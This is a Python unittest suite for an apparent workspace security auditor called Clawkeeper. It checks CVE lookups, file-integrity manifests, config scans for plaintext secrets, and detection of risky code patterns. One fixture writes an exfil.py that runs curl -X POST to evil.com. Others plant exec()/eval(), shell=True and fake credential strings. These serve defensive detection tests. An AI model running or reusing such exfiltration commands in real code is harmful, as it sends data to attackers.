#!/usr/bin/env python3
"""
Clawkeeper Auditor 测试套件
覆盖：主动扫描（CVEs / 完整性 / Skill模式 / 配置基线）
"""

import os
import sys
import json
import tempfile
import unittest
from pathlib import Path

PROJECT_ROOT = Path(__file__).parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

from clawkeeper.auditor import Auditor


class TestActiveScan(unittest.TestCase):
    """主动扫描测试"""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.auditor = Auditor(workspace=str(self.temp_dir))

        # 创建测试文件结构
        self.memory_dir = Path(self.temp_dir) / "memory"
        self.memory_dir.mkdir()
        self.scripts_dir = Path(self.temp_dir) / "scripts"
        self.scripts_dir.mkdir()
        self.clwk_dir = Path(self.temp_dir) / "clawkeeper"
        self.clwk_dir.mkdir()

    def tearDown(self):
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    # ===== CVE 检查 =====

    def test_cve_check_returns_structure(self):
        """CVE 检查返回结构化结果"""
        result = self.auditor._check_dependencies()
        self.assertIn("status", result)
        self.assertIn("tool", result)
        self.assertIn("vulnerabilities", result)
        self.assertIn(result["status"], ["clean", "warning", "error"])

    # ===== Skill 模式扫描 =====

    def test_skill_scan_finds_exec(self):
        """Skill 扫描发现 exec() 调用"""
        test_file = self.scripts_dir / "evil.py"
        test_file.write_text("""
def run():
    exec("print('hello')")
    result = eval("1 + 1")
""")

        result = self.auditor._scan_skill_patterns()

        self.assertGreater(len(result["findings"]), 0)
        patterns = [f["pattern"] for f in result["findings"]]
        self.assertTrue(
            any("exec()" in p for p in patterns),
            f"应发现 exec()，实际 patterns: {patterns}"
        )

    def test_skill_scan_finds_shell_injection(self):
        """Skill 扫描发现 shell=True"""
        test_file = self.scripts_dir / "shell.py"
        test_file.write_text("""
import subprocess
subprocess.run("echo hello", shell=True)
""")

        result = self.auditor._scan_skill_patterns()
        patterns = [f["pattern"] for f in result["findings"]]
        self.assertTrue(
            any("shell=True" in p for p in patterns),
            f"应发现 shell=True，实际: {patterns}"
        )

    def test_skill_scan_finds_curl(self):
        """Skill 扫描发现 curl 命令"""
        test_file = self.scripts_dir / "exfil.py"
        test_file.write_text("""
import os
os.system("curl -X POST https://evil.com")
""")

        result = self.auditor._scan_skill_patterns()
        patterns = [f["pattern"] for f in result["findings"]]
        self.assertTrue(
            any("curl" in p for p in patterns),
            f"应发现 curl，实际: {patterns}"
        )

    def test_skill_scan_ignores_comments(self):
        """Skill 扫描忽略注释中的代码"""
        test_file = self.scripts_dir / "comment_only.py"
        test_file.write_text("# exec(\"this is just a comment\")")

        result = self.auditor._scan_skill_patterns()
        self.assertEqual(len(result["findings"]), 0)

    def test_skill_scan_counts_files(self):
        """Skill 扫描统计文件数（至少 1）"""
        # 创建至少一个 Python 文件
        (self.scripts_dir / "dummy.py").write_text("# dummy")
        result = self.auditor._scan_skill_patterns()
        # scanned_files 应 ≥ 1
        self.assertGreaterEqual(result["scanned_files"], 1)

    # ===== 配置基线检查 =====

    def test_config_baseline_returns_structure(self):
        """配置基线返回结构化结果"""
        result = self.auditor._check_config_baseline()
        self.assertIn("status", result)
        self.assertIn("issues", result)

    def test_config_baseline_detects_plaintext_secrets(self):
        """配置基线检测明文密钥"""
        config_file = self.clwk_dir / "config.yaml"
        config_file.write_text("""
app_secret: "LnhAyBpISIdxW6NAeyfP3emWPmvBO7dX"
github_token: "ghp_fakeTokenHere1234567890abcdef"
""")

        result = self.auditor._check_yaml_secrets(config_file)
        self.assertGreater(len(result), 0)

    # ===== 完整性校验 =====

    def test_integrity_no_manifest_is_unknown(self):
        """无 manifest 时返回 unknown"""
        result = self.auditor._check_file_integrity()
        self.assertEqual(result["status"], "unknown")

    def test_integrity_clean_after_save(self):
        """保存后立即验证为 clean"""
        (self.memory_dir / "clean.md").write_text("# clean")

        from clawkeeper.detector import RiskDetector
        detector = RiskDetector()
        detector.workspace = str(self.temp_dir)
        detector.save_integrity_manifest()

        result = self.auditor._check_file_integrity()
        self.assertEqual(result["status"], "clean")

    def test_integrity_detects_added_file(self):
        """完整性检测新增文件"""
        from clawkeeper.detector import RiskDetector
        detector = RiskDetector()
        detector.workspace = str(self.temp_dir)
        detector.save_integrity_manifest()

        (self.memory_dir / "new.md").write_text("# new")

        result = self.auditor._check_file_integrity()
        self.assertEqual(result["status"], "compromised")
        self.assertTrue(any("new.md" in str(a) for a in result["added"]))

    def test_integrity_detects_tampered_file(self):
        """完整性检测篡改"""
        from clawkeeper.detector import RiskDetector
        detector = RiskDetector()
        detector.workspace = str(self.temp_dir)
        tamper = self.memory_dir / "data.md"
        tamper.write_text("original")
        detector.save_integrity_manifest()

        tamper.write_text("modified by attacker")

        result = self.auditor._check_file_integrity()
        self.assertEqual(result["status"], "compromised")
        self.assertTrue(any("data.md" in str(c["file"]) for c in result["changed"]))

    # ===== 主动扫描汇总 =====

    def test_active_scan_returns_all_sections(self):
        """active_scan 返回所有扫描项"""
        result = self.auditor.active_scan()
        self.assertIn("status", result)
        self.assertIn("cve_check", result)
        self.assertIn("file_integrity", result)
        self.assertIn("skill_audit", result)
        self.assertIn("config_baseline", result)

    def test_format_scan_report_returns_text(self):
        """format_scan_report 返回文本"""
        result = self.auditor.active_scan()
        report = self.auditor.format_scan_report(result)
        self.assertIsInstance(report, str)
        self.assertIn("Clawkeeper", report)


class TestPassiveAudit(unittest.TestCase):
    """被动日志分析测试"""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.audit_file = Path(self.temp_dir) / "audit.log"
        self.auditor = Auditor(audit_log_path=str(self.audit_file))

    def tearDown(self):
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_get_entries_empty_log(self):
        result = self.auditor.get_entries()
        self.assertEqual(result, [])

    def test_get_entries_filters_by_level(self):
        self.audit_file.write_text(
            json.dumps({"level": "SAFE", "time": "2026-04-19T10:00:00"}) + "\n"
            + json.dumps({"level": "HIGH", "time": "2026-04-19T11:00:00"}) + "\n"
        )
        result = self.auditor.get_entries(level_filter=["HIGH"])
        self.assertEqual(len(result), 1)
        self.assertEqual(result[0]["level"], "HIGH")

    def test_generate_report_stats(self):
        self.audit_file.write_text(
            json.dumps({"level": "SAFE", "event": "READ"}) + "\n"
            + json.dumps({"level": "HIGH", "event": "DELETE"}) + "\n"
        )
        report = self.auditor.generate_report(period_hours=24)
        self.assertEqual(report["summary"]["total"], 2)
        self.assertIn("by_level", report["summary"])


if __name__ == "__main__":
    unittest.main(verbosity=2)
